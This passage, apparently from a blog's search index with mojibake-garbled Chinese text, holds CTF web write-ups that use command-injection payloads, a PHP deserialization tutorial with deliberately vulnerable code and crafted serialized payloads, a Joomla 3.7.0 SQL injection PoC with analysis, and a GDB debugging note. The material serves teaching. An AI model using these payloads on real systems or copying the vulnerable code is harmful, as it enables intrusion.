base64-decodeå¾—åˆ°æœ€åŽflag:123&lt;?php$flag='flag&#123;38cac0e4974e0e97614908f901e45fe3&#125;';?&gt; WEB-02ä¸Šå¾¡å‰‘æ‰«æã€‚å‘çŽ°æ•æ„Ÿæ–‡ä»¶robots.txtã€‚12345User-agent: *Disallow:Disallow: /imagesDisallow: /jsDisallow: /css åœ¨jsç›®å½•ä¸‹æœ‰flag.txt è®¿é—®ï¼š1flag&#123;89a7f0eb82a314e5745ec9bc556d06c5&#125; WEB-03é¢˜ç›®ç»™äº†æºç 1234567891011121314151617181920&lt;?phpif(isset($_REQUEST[ 'ip' ])) &#123; $target = trim($_REQUEST[ 'ip' ]); $substitutions = array( '&amp;' =&gt; '', ';' =&gt; '', '|' =&gt; '', '-' =&gt; '', '$' =&gt; '', '(' =&gt; '', ')' =&gt; '', '`' =&gt; '', '||' =&gt; '', ); $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); $cmd = shell_exec( 'ping -c 4 ' . $target ); echo $target; echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;";&#125;show_source(__FILE__); æ‹¿DVWAä»£ç æ”¹çš„ï¼Œç®€ç›´æ— åŠ›åæ§½ã€‚ payload1ï¼š1http://XXXX:83/index.php?ip=127.0.0.1%0als paylaod2:1http://XXXX:83/index.php?ip=127.0.0.1%0acat flag.php WEB-04é¢˜ç›®ç»™äº†æºç ï¼š123456789&lt;?phpif( isset( $_REQUEST['ip']) ) &#123; $target = $_REQUEST[ 'ip' ]; $cmd = shell_exec( 'ping -c 4 ' . $target ); echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;";&#125;show_source(__FILE__);?&gt; æ²¡ä»»ä½•è¿‡æ»¤ï¼Œpayload1ï¼š1http://XXXX:84/index.php?ip=127.0.0.2 | ls payload2ï¼š1http://XXXX:84/index.php?ip=127.0.0.1 | cat flag.php flag:1flag&#123;19b55155-f84c-47ef-aeaa-038116de31e5&#125; å°æ‰¯ä¸¤å¥å¥½å§ï¼Œè¿™webé¢˜çš„è´¨é‡ï¼Œä¸æ•¢æ­ç»´ã€‚]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[æµ…è°ˆphpååºåˆ—åŒ–æ¼æ´ž]]></title>
      <url>%2F2017%2F06%2F17%2F%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[phpååºåˆ—åŒ–æ¼æ´žï¼Œåˆå«phpå¯¹è±¡æ³¨å…¥æ¼æ´žã€‚ åºåˆ—åŒ–ä¸Žååºåˆ—åŒ–phpä¸­æœ‰ä¸¤ä¸ªå‡½æ•°serialize() å’Œunserialize()ã€‚ serialize()å½“åœ¨phpä¸­åˆ›å»ºäº†ä¸€ä¸ªå¯¹è±¡åŽï¼Œå¯ä»¥é€šè¿‡serialize()æŠŠè¿™ä¸ªå¯¹è±¡è½¬å˜æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¿å­˜å¯¹è±¡çš„å€¼æ–¹ä¾¿ä¹‹åŽçš„ä¼ é€’ä¸Žä½¿ç”¨ã€‚æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼›123456789&lt;?phpclass chybeta&#123; var $test = '123';&#125;$class1 = new chybeta;$class1_ser = serialize($class1);print_r($class1_ser);?&gt; è¿™è¾¹æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œå¹¶ä¸”å°†å…¶åºåˆ—åŒ–åŽçš„ç»“æžœæ‰“å°å‡ºæ¥ï¼š1O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125; è¿™é‡Œçš„Oä»£è¡¨å­˜å‚¨çš„æ˜¯å¯¹è±¡ï¼ˆobjectï¼‰,å‡å¦‚ä½ ç»™serialize()ä¼ å…¥çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£å®ƒä¼šå˜æˆå­—æ¯aã€‚7è¡¨ç¤ºå¯¹è±¡çš„åç§°æœ‰7ä¸ªå­—ç¬¦ã€‚&quot;chybeta&quot;è¡¨ç¤ºå¯¹è±¡çš„åç§°ã€‚1è¡¨ç¤ºæœ‰ä¸€ä¸ªå€¼ã€‚{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}ä¸­ï¼Œsè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œ4è¡¨ç¤ºè¯¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œ&quot;test&quot;ä¸ºå­—ç¬¦ä¸²çš„åç§°ï¼Œä¹‹åŽçš„ç±»ä¼¼ã€‚ unserialize()ä¸Ž serialize() å¯¹åº”çš„ï¼Œunserialize()å¯ä»¥ä»Žå·²å­˜å‚¨çš„è¡¨ç¤ºä¸­åˆ›å»ºPHPçš„å€¼ï¼Œå•å°±æœ¬æ¬¡æ‰€å…³å¿ƒçš„çŽ¯å¢ƒè€Œè¨€ï¼Œå¯ä»¥ä»Žåºåˆ—åŒ–åŽçš„ç»“æžœä¸­æ¢å¤å¯¹è±¡ï¼ˆobjectï¼‰ã€‚123456789101112&lt;?phpclass chybeta&#123; var $test = '123';&#125;$class2 = 'O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'; print_r($class2);echo "&lt;/br&gt;";$class2_unser = unserialize($class2);print_r($class2_ser);?&gt; è¿™é‡Œæé†’ä¸€ä¸‹ï¼Œå½“ä½¿ç”¨ unserialize() æ¢å¤å¯¹è±¡æ—¶ï¼Œ å°†è°ƒç”¨ __wakeup() æˆå‘˜å‡½æ•°ã€‚ ååºåˆ—åŒ–æ¼æ´žç”±å‰é¢å¯ä»¥çœ‹å‡ºï¼Œå½“ä¼ ç»™ unserialize() çš„å‚æ•°å¯æŽ§æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥ä¸€ä¸ªç²¾å¿ƒæž„é€ çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä»Žè€ŒæŽ§åˆ¶å¯¹è±¡å†…éƒ¨çš„å˜é‡ç”šè‡³æ˜¯å‡½æ•°ã€‚ åˆ©ç”¨æž„é€ å‡½æ•°ç­‰Magic functionphpä¸­æœ‰ä¸€ç±»ç‰¹æ®Šçš„æ–¹æ³•å«â€œMagic functionâ€ï¼Œ è¿™é‡Œæˆ‘ä»¬ç€é‡å…³æ³¨ä¸€ä¸‹å‡ ä¸ªï¼š æž„é€ å‡½æ•°__construct()ï¼šå½“å¯¹è±¡åˆ›å»º(new)æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ä½†åœ¨unserialize()æ—¶æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çš„ã€‚ æžæž„å‡½æ•°__destruct()ï¼šå½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ __wakeup() ï¼šå¦‚å‰æ‰€æï¼Œunserialize()æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ æµ‹è¯•å¦‚ä¸‹ï¼š12345678910111213141516171819202122232425&lt;?phpclass chybeta&#123; var $test = '123'; function __wakeup()&#123; echo "__wakeup"; echo "&lt;/br&gt;"; &#125; function __construct()&#123; echo "__construct"; echo "&lt;/br&gt;"; &#125; function __destruct()&#123; echo "__destruct"; echo "&lt;/br&gt;"; &#125;&#125;$class2 = 'O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'; print_r($class2);echo "&lt;/br&gt;";$class2_unser = unserialize($class2);print_r($class2_unser);echo "&lt;/br&gt;";?&gt; åˆ©ç”¨åœºæ™¯__wakeup() æˆ–__destruct()ç”±å‰å¯ä»¥çœ‹åˆ°ï¼Œunserialize()åŽä¼šå¯¼è‡´__wakeup() æˆ–__destruct()çš„ç›´æŽ¥è°ƒç”¨ï¼Œä¸­é—´æ— éœ€å…¶ä»–è¿‡ç¨‹ã€‚å› æ­¤æœ€ç†æƒ³çš„æƒ…å†µå°±æ˜¯ä¸€äº›æ¼æ´ž/å±å®³ä»£ç åœ¨__wakeup() æˆ–__destruct()ä¸­ï¼Œä»Žè€Œå½“æˆ‘ä»¬æŽ§åˆ¶åºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶å¯ä»¥åŽ»ç›´æŽ¥è§¦å‘å®ƒä»¬ã€‚è¿™é‡Œé’ˆå¯¹ __wakeup() åœºæ™¯åšä¸ªå®žéªŒã€‚å‡è®¾indexæºç å¦‚ä¸‹ï¼š123456789101112131415161718&lt;?phpclass chybeta&#123; var $test = '123'; function __wakeup()&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class3 = $_GET['test'];print_r($class3);echo "&lt;/br&gt;";$class3_unser = unserialize($class3);require "shell.php";// ä¸ºæ˜¾ç¤ºæ•ˆæžœï¼ŒæŠŠè¿™ä¸ªshell.phpåŒ…å«è¿›æ¥?&gt; åŒç›®å½•ä¸‹æœ‰ä¸ªç©ºçš„shell.phpæ–‡ä»¶ã€‚ä¸€å¼€å§‹è®¿é—®index.phpã€‚ åŸºæœ¬çš„æ€è·¯æ˜¯ï¼Œæœ¬åœ°æ­å»ºå¥½çŽ¯å¢ƒï¼Œé€šè¿‡ serialize() å¾—åˆ°æˆ‘ä»¬è¦çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä¹‹åŽå†ä¼ è¿›åŽ»ã€‚é€šè¿‡æºä»£ç çŸ¥ï¼ŒæŠŠå¯¹è±¡ä¸­çš„testå€¼èµ‹ä¸º â€œ&lt;?php phpinfo(); ?&gt;â€,å†è°ƒç”¨unserialize()æ—¶ä¼šé€šè¿‡__wakeup()æŠŠtestçš„å†™å…¥åˆ°shell.phpä¸­ã€‚ä¸ºæ­¤æˆ‘ä»¬å†™ä¸ªphpè„šæœ¬ï¼š123456789101112&lt;?phpclass chybeta&#123; var $test = '123'; function __wakeup()&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class4 = new chybeta();$class4-&gt;test = "&lt;?php phpinfo(); ?&gt;"; $class4_ser = serialize($class4); print_r($class4_ser);?&gt; ç”±æ­¤å¾—åˆ°åºåˆ—åŒ–ç»“æžœï¼š1O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;&#125; å…¶ä»–Magic functionçš„åˆ©ç”¨ä½†å¦‚æžœä¸€æ¬¡unserialize()ä¸­å¹¶ä¸ä¼šç›´æŽ¥è°ƒç”¨çš„é­”æœ¯å‡½æ•°ï¼Œæ¯”å¦‚å‰é¢æåˆ°çš„__construct()ï¼Œæ˜¯ä¸æ˜¯å°±æ²¡æœ‰åˆ©ç”¨ä»·å€¼å‘¢ï¼Ÿéžä¹Ÿã€‚ç±»ä¼¼äºŽPWNä¸­çš„ROPï¼Œæœ‰æ—¶å€™ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œç”±å®ƒè°ƒç”¨çš„__wakeup()ä¸­åˆåŽ»è°ƒç”¨äº†å…¶ä»–çš„å¯¹è±¡ï¼Œç”±æ­¤å¯ä»¥æº¯æºè€Œä¸Šï¼Œåˆ©ç”¨ä¸€æ¬¡æ¬¡çš„â€œgadgetâ€æ‰¾åˆ°æ¼æ´žç‚¹ã€‚123456789101112131415161718192021222324&lt;?phpclass ph0en1x&#123; function __construct($test)&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$test); fclose($fp); &#125;&#125;class chybeta&#123; var $test = '123'; function __wakeup()&#123; $obj = new ph0en1x($this-&gt;test); &#125;&#125;$class5 = $_GET['test'];print_r($class5);echo "&lt;/br&gt;";$class5_unser = unserialize($class5);require "shell.php";?&gt; è¿™é‡Œæˆ‘ä»¬ç»™testä¼ å…¥æž„é€ å¥½çš„åºåˆ—åŒ–å­—ç¬¦ä¸²åŽï¼Œè¿›è¡Œååºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨ __wakeup()å‡½æ•°ï¼Œä»Žè€Œåœ¨new ph0en1x()ä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡ph0en1xä¸­çš„__construct()æ–¹æ³•ï¼Œä»Žè€ŒæŠŠ&lt;?php phpinfo() ?&gt;å†™å…¥åˆ° shell.phpä¸­ã€‚ åˆ©ç”¨æ™®é€šæˆå‘˜æ–¹æ³•å‰é¢è°ˆåˆ°çš„åˆ©ç”¨éƒ½æ˜¯åŸºäºŽâ€œè‡ªåŠ¨è°ƒç”¨â€çš„magic functionã€‚ä½†å½“æ¼æ´ž/å±é™©ä»£ç å­˜åœ¨ç±»çš„æ™®é€šæ–¹æ³•ä¸­ï¼Œå°±ä¸èƒ½æŒ‡æœ›é€šè¿‡â€œè‡ªåŠ¨è°ƒç”¨â€æ¥è¾¾åˆ°ç›®çš„äº†ã€‚è¿™æ—¶çš„åˆ©ç”¨æ–¹æ³•å¦‚ä¸‹ï¼Œå¯»æ‰¾ç›¸åŒçš„å‡½æ•°åï¼ŒæŠŠæ•æ„Ÿå‡½æ•°å’Œç±»è”ç³»åœ¨ä¸€èµ·ã€‚12345678910111213141516171819202122232425262728293031&lt;?phpclass chybeta &#123; var $test; function __construct() &#123; $this-&gt;test = new ph0en1x(); &#125; function __destruct() &#123; $this-&gt;test-&gt;action(); &#125;&#125;class ph0en1x &#123; function action() &#123; echo "ph0en1x"; &#125;&#125;class ph0en2x &#123; var $test2; function action() &#123; eval($this-&gt;test2); &#125;&#125;$class6 = new chybeta();unserialize($_GET['test']);?&gt; æœ¬æ„ä¸Šï¼Œnewä¸€ä¸ªæ–°çš„chybetaå¯¹è±¡åŽï¼Œè°ƒç”¨__construct()ï¼Œå…¶ä¸­åˆnewäº†ph0en1xå¯¹è±¡ã€‚åœ¨ç»“æŸåŽä¼šè°ƒç”¨__destruct()ï¼Œå…¶ä¸­ä¼šè°ƒç”¨action()ï¼Œä»Žè€Œè¾“å‡º ph0en1xã€‚ ä¸‹é¢æ˜¯åˆ©ç”¨è¿‡ç¨‹ã€‚æž„é€ åºåˆ—åŒ–ã€‚123456789101112131415&lt;?phpclass chybeta &#123; var $test; function __construct() &#123; $this-&gt;test = new ph0en2x(); &#125;&#125;class ph0en2x &#123; var $test2 = &quot;phpinfo();&quot;;&#125;echo serialize(new chybeta());?&gt; å¾—åˆ°ï¼š1O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;O:7:&quot;ph0en2x&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125; ä¼ ç»™index.phpçš„testå‚æ•°ï¼Œåˆ©ç”¨æˆåŠŸï¼š]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[[CVE-2017-8917]Joomla! 3.7.0 SQL Injectionåˆ†æž]]></title>
      <url>%2F2017%2F05%2F19%2FCVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[Joomla!3.7.0 Core SQLæ³¨å…¥æ¼æ´ž. POCè¿™æ¬¡å¹²è„†å…ˆæ”¾å‡ºpocå§ã€‚12345http://localhost:2500/Joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,database()),0) è¿™æ¬¡æ ¹æ®å‚æ•°çš„ä¼ å…¥æµç¨‹æ¥è¿›è¡Œåˆ†æžã€‚ æ¼æ´žå±å®³ç»„ä»¶3.7.0ç‰ˆæœ¬ä¸­å‡ºçŽ°äº†com_fieldç»„ä»¶,æ— éœ€æŽˆæƒå³å¯è®¿é—®ã€‚æŸ¥çœ‹...\components\com_fields\controller.phpï¼Œåœ¨ç¬¬27è¡Œå·¦å³ï¼Œå…¶ç›¸å…³ä»£ç å¦‚ä¸‹ï¼š12345678910111213141516public function __construct($config = array()) &#123; $this-&gt;input = JFactory::getApplication()-&gt;input; // Frontpage Editor Fields Button proxying: if ($this-&gt;input-&gt;get('view') === 'fields' &amp;&amp; $this-&gt;input-&gt;get('layout') === 'modal') &#123; // Load the backend language file. $lang = JFactory::getLanguage(); $lang-&gt;load('com_fields', JPATH_ADMINISTRATOR); $config['base_path'] = JPATH_COMPONENT_ADMINISTRATOR; &#125; parent::__construct($config); &#125; å¯ä»¥çœ‹åˆ°å®ƒå…ˆåˆ¤æ–­é€šè¿‡viewæ˜¯å¦ç­‰äºŽfields,layoutæ˜¯å¦ç­‰äºŽmodal,è€Œè¿™ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯æˆ‘ä»¬å¯æŽ§çš„ã€‚è‹¥æ»¡è¶³åˆ™å°†ä¼šåŠ è½½JPATH_ADMINISTRATORä¸­çš„com_fieldsç»„ä»¶ï¼Œå¹¶ä¸”å°†base_pathè®¾ç½®ä¸º JPATH_COMPONENT_ADMINISTRATORï¼Œä¹‹åŽè°ƒç”¨çˆ¶ç±»çš„æž„é€ æ–¹æ³•ã€‚ ä¼ å…¥sqlè¯­å¥åœ¨è°ƒç”¨çˆ¶ç±»æž„é€ æ–¹æ³•åŽï¼Œä¸€è·¯è¿è¡Œåˆ°...\Joomla370\libraries\legacy\controller\legacy.phpä¸­ï¼Œçº¦èŽ«707è¡Œï¼Œè¿™æ—¶ä¼šé€šè¿‡$this-&gt;$doTaskè°ƒç”¨display()å‡½æ•°ã€‚ è·Ÿè¿›display()å‡½æ•°ï¼Œå®ƒä½äºŽ ...\Joomla370\libraries\legacy\controller\legacy.phpï¼ŒæŽ¥ç€è¿è¡Œè‡³legacy.phpçš„çº¦èŽ«671è¡Œå·¦å³ï¼Œè°ƒç”¨äº†è§†å›¾ï¼ˆviewï¼‰çš„display()å‡½æ•°ã€‚æˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ï¼Œè·³è½¬è¿›å…¥...\Joomla370\administrator\components\com_fields\views\fields\view.html.phpï¼Œ æ­¤æ—¶è¿è¡Œåˆ°ï¼Œä¸‹é¢è¿™æ¡è¯­å¥ï¼Œç»™get()ä¼ å…¥çš„å‚æ•°ä¸ºState 1$this-&gt;state = $this-&gt;get('State'); æˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªget()å‡½æ•°ï¼Œä¸€ç›´è¿è¡Œåˆ°422è¡Œï¼Œ ä¹‹åŽå°†ä¼šè°ƒç”¨ getState()ï¼Œè·Ÿè¿›ï¼Œè¿›å…¥...\Joomla370\libraries\legacy\model\legacy.php ä¹‹åŽä¼šè°ƒç”¨filedsModelç±»ä¸­çš„populateState()ï¼Œè·Ÿè¿›åŽä¼šå‘çŽ°è°ƒç”¨å…¶çˆ¶ç±»çš„populateState()å‡½æ•°ï¼Œå…¶å®šä¹‰åœ¨ ...\Joomla370\libraries\legacy\model\list.phpä¸­ï¼Œçº¦èŽ«åœ¨ç¬¬495è¡Œï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š12345..çœç•¥..if ($list = $app-&gt;getUserStateFromRequest($this-&gt;context . '.list', 'list', array(), 'array'))..çœç•¥.. è¿™é‡Œæˆ‘ä»¬å…ˆè·Ÿè¿›ä¸€ä¸‹getUserStateFromRequest()ï¼Œå®ƒçš„å®šä¹‰åœ¨...\Joomla370\libraries\cms\application\cms.phpä¸­ï¼Œåœ¨è¯¥å‡½æ•°ç»“æŸåŽï¼Œå®ƒèŽ·å–äº†æˆ‘ä»¬é€šè¿‡getæ–¹æ³•ä¼ å…¥çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æˆåŠŸçš„æŽ§åˆ¶äº†fullorderingçš„å€¼ã€‚ åœ¨è¯¥å‡½æ•°è¿è¡Œå®ŒåŽï¼Œæµç¨‹å°†ä¼šå›žåˆ°å‰é¢çš„é‚£ä¸ªå®šä¹‰åœ¨...\Joomla370\libraries\cms\application\cms.phpä¸­çš„populateState()å‡½æ•°ã€‚æ­¤æ—¶è¿è¡Œçš„ä»£ç å¦‚ä¸‹ï¼š12345678910foreach ($list as $name =&gt; $value)&#123; // Exclude if blacklisted if (!in_array($name, $this-&gt;listBlacklist)) &#123; // Extra validations switch ($name)&#123;...&#125; $this-&gt;setState('list.' . $name, $value); &#125;&#125; å¦‚æžœæ•°ç»„çš„keyä¸åœ¨é»‘åå•ï¼ˆblacklistedï¼‰ä¸­ï¼Œå°†ä¼šä¸º$listå˜é‡æ ¹æ®ç›¸åº”çš„Stateè¿›è¡Œæ³¨å†Œï¼Œåœ¨è¿™éƒ¨åˆ†å‡½æ•°è¿è¡Œåˆ°ç»“æŸéƒ¨åˆ†ï¼Œå¯ä»¥çœ‹è§æˆåŠŸçš„æŽ§åˆ¶äº†listæ•°ç»„çš„fullorderingçš„å€¼ã€‚ æŸ¥çœ‹å˜é‡ï¼Œå¦‚ä¸‹ï¼š æ³¨å…¥è¿‡ç¨‹æŽ¥ä¸‹æ¥ç»§ç»­è¿è¡Œï¼Œä¸€ç›´è¿è¡Œå›žåˆ°Joomla370\administrator\components\com_fields\views\fields\view.html.phpä¸­çš„display()å‡½æ•°ä¸­ã€‚ è·Ÿè¿›è¿™ä¸€è¡Œ $this-&gt;get(&#39;Items&#39;);ï¼Œè¿›å…¥...\Joomla370\libraries\legacy\view\legacy.phpï¼Œçº¦èŽ«åœ¨422è¡Œ,è¿™é‡Œçš„è¡Œä¸ºè·Ÿå‰é¢åˆ†æžç±»ä¼¼ï¼Œæ­¤åŽå°†ä¼šè°ƒç”¨getitem()ï¼š ç»§ç»­è·Ÿè¿›ï¼Œè¿›å…¥...\Joomla370\libraries\legacy\model\list.phpï¼Œçº¦èŽ«åœ¨186è¡Œï¼š12345try &#123; // Load the list items and add the items to the internal cache. $this-&gt;cache[$store] = $this-&gt;_getList($this-&gt;_getListQuery(), $this-&gt;getStart(), $this-&gt;getState('list.limit')); &#125; é€šè¿‡_getListè°ƒç”¨äº†_getListQuery,ç»§ç»­è·Ÿè¿›ï¼Œè¿›å…¥...\Joomla370\libraries\legacy\model\list.phpï¼Œçº¦èŽ«åœ¨ 132è¡Œï¼Œ12345if ($lastStoreId != $currentStoreId || empty($this-&gt;query))&#123; $lastStoreId = $currentStoreId; $this-&gt;query = $this-&gt;getListQuery();&#125; è°ƒç”¨äº† getListQuery()ï¼Œç»§ç»­è·Ÿè¿›ï¼Œè¿›å…¥ ...\Joomla370\administrator\components\com_fields\models\fields.php,ä¸€ç›´è¿è¡Œåˆ°çº¦èŽ«åœ¨ 305 è¡Œï¼Œè°ƒç”¨getStateæ–¹æ³•ï¼Œä¼ å…¥list.fullorderingå‚æ•°ã€‚ç›¸å…³ä»£ç å¦‚ä¸‹ï¼š æŸ¥çœ‹å˜é‡è¡¨ï¼š ä¹‹åŽåœ¨ç¬¬314è¡Œï¼Œå°†$listOrderingå¸¦å…¥æŸ¥è¯¢ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š1$query-&gt;order($db-&gt;escape($listOrdering) . ' ' . $db-&gt;escape($orderDirn)); åœ¨è¿›è¡Œ$query-&gt;orderä¹‹å‰ï¼Œä¼šå…ˆè¿›è¡Œä¸€æ¬¡è¿‡æ»¤ï¼Œè·Ÿè¿›$db-&gt;escapeï¼Œè¿›å…¥...\Joomla370\libraries\joomla\database\driver\mysqli.phpï¼Œçº¦èŽ«242è¡Œï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š12345678910111213public function escape($text, $extra = false) &#123; $this-&gt;connect(); $result = mysqli_real_escape_string($this-&gt;getConnection(), $text); if ($extra) &#123; $result = addcslashes($result, '%_'); &#125; return $result; &#125; å¯¹äºŽä¼ å…¥çš„$texté€šè¿‡mysqli_real_escape_string()è¿›è¡Œè¿‡æ»¤ï¼Œåªè½¬ä¹‰äº†ä¸€äº›å­—ç¬¦ã€‚å› æ­¤å¯ä»¥é€šè¿‡æž„é€ è¿›è¡ŒæˆåŠŸçš„æ³¨å…¥ã€‚ æˆåŠŸæ³¨å…¥]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ä¸€æ¬¡æ°´æ°´çš„è°ƒè¯•]]></title>
      <url>%2F2017%2F05%2F16%2F%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84GDB%E8%B0%83%E8%AF%95%2F</url>
      <content type="text"><![CDATA[Linux ä½œä¸šâ€¦ ç¼–è¯‘1gcc -g -O0 array.c main.c -o test è°ƒè¯•1gdb test é€šè¿‡listå‘½ä»¤ï¼Œå¯ä»¥æ˜¾ç¤ºå‡ºéƒ¨åˆ†æºä»£ç ï¼Œæˆ‘ä»¬é€‰æ‹©åœ¨æºä»£ç çš„ç¬¬9è¡Œå¤„ä¸‹æ–­ç‚¹ã€‚ é€šè¿‡printå‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹å˜é‡çš„å€¼ï¼Œå› ä¸ºæ•°ç»„åå·²çŸ¥ï¼Œå¯ä»¥å¦‚ä¸‹æ‰“å°å‡ºæ•°ç»„çš„å†…å®¹ã€‚å¯ä»¥å‘çŽ°ï¼Œåœ¨è¿˜æ²¡æœ‰åˆå§‹åŒ–æˆ–è€…èµ‹å€¼å‰ï¼Œæ•°ç»„å†…å®¹æ˜¯éšæœºåŒ–ï¼ˆæˆ–è€…è¯´æ˜¯åžƒåœ¾æ•°æ®ï¼‰ã€‚ æ­¤æ—¶ç¨‹åºè¿è¡Œåˆ°ç¬¬9è¡Œé™„è¿‘ï¼Œå¯ä»¥å†æ¬¡é€šè¿‡listå‘½ä»¤æ˜¾ç¤ºå…¶é™„è¿‘çš„æºä»£ç ã€‚ è¿™é‡Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬åœ¨ç¬¬11ï¼Œ12ï¼Œ15è¡Œä¸‹ä¸‹æ–­ç‚¹ï¼Œåˆ†åˆ«å¯¹åº”ä¸¤ä¸ªarray_fill_with() å‡½æ•° å’Œ array_add()å‡½æ•°ã€‚ æŽ¥ä¸‹æ¥å•æ­¥è°ƒè¯•ï¼Œå‘½ä»¤æ˜¯ 1gdb-peda$ n æ­¤æ—¶åœ¨æ‰§è¡Œå®Œç¬¬11è¡Œçš„array_fill_with(),å³å·²ç»å®Œæˆäº†å¯¹æ•°ç»„vector_açš„èµ‹å€¼åŽï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸‹ä¸‰ä¸ªæ•°ç»„çš„å€¼ã€‚ æ•°ç»„vector_aå…¨è¢«èµ‹å€¼ä¸º10åœ¨æ„æ–™ä¹‹ä¸­ï¼ˆ0xa == 10 ï¼‰ï¼Œä½†æ³¨æ„æ•°ç»„vector_bçš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¹Ÿè¢«èµ‹å€¼ä¸º0xaäº†ã€‚åœ¨å‰é¢å¯çŸ¥ï¼Œæ•°ç»„vector_bçš„ç¬¬ä¸€ä¸ªå…ƒç´ åŽŸæœ¬æ˜¯0xff00ã€‚æ‰€ä»¥è¿™è¾¹å¯èƒ½äº§ç”Ÿäº†ä¸€ä¸ªè¶Šç•Œã€‚ ä¸‹ä¸€æ¡è¯­å¥æ˜¯å¯¹æ•°ç»„vector_bè¿›è¡Œèµ‹å€¼ï¼Œè¿™æ¬¡æˆ‘ä»¬é€‰æ‹©è¿›å…¥å‡½æ•°array_fill_with()ï¼Œå³è¿›è¡Œstep intoï¼Œgdbä¸­ç›¸åº”çš„å‘½ä»¤ä¸ºï¼š1gdb-peda$ s ç”±ä¸Šå›¾ï¼Œé€šè¿‡listå‘½ä»¤ï¼Œå¯çŸ¥æˆ‘ä»¬å·²ç»è¿›å…¥åˆ°äº†array.cä¸­çš„ç¬¬ä¸ƒè¡Œï¼Œæ­£åœ¨è¿›è¡Œä¸€ä¸ªå¾ªçŽ¯ã€‚å…¶ä¸­å˜é‡lengthçš„å€¼ä¸º0x10ï¼Œå³ä¸º16ã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨Cè¯­è¨€ä¸­ï¼Œæ•°ç»„ä¸‹æ ‡æ˜¯ä»Ž0å¼€å§‹çš„ï¼Œè¿™é‡Œä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆæˆ‘ä»¬å†å¯¹æ•°ç»„vector_aèµ‹å€¼å®ŒåŽï¼Œæ•°ç»„vector_bçš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¹Ÿè¢«æ”¹å˜äº†ã€‚ æŽ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­è¿è¡Œç¨‹åºï¼Œå‘½ä»¤ä¸ºï¼š1gdb-peda$ c æ­¤æ—¶ï¼Œå·²ç»å®Œæˆäº†å¯¹æ•°ç»„vector_bçš„èµ‹å€¼ï¼Œæˆ‘ä»¬å¯ä»¥æŽ¨æµ‹æ•°ç»„vector_cçš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¹Ÿä¼šè¢«ä»ŽåŽŸå…ˆçš„ 0x0 æ”¹ä¸º 0x37ã€‚äº‹å®žè¯æ˜Žï¼ŒæŽ¨æµ‹æ˜¯æ­£ç¡®çš„ï¼Œè§ä¸‹å›¾ï¼š Bugå…¶å®žé‡ç‚¹å°±ä¸€ä¸ªï¼ŒCè¯­è¨€ä¸­æ•°ç»„ä¸‹æ ‡ä»Ž0å¼€å§‹çš„ã€‚æŠŠarray.cä¸­çš„i &lt;= length æ”¹ä¸º i &lt; lengthå°±okå•¦ã€‚]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[åˆ©ç”¨PHPçš„OPcacheæœºåˆ¶getshell]]></title>
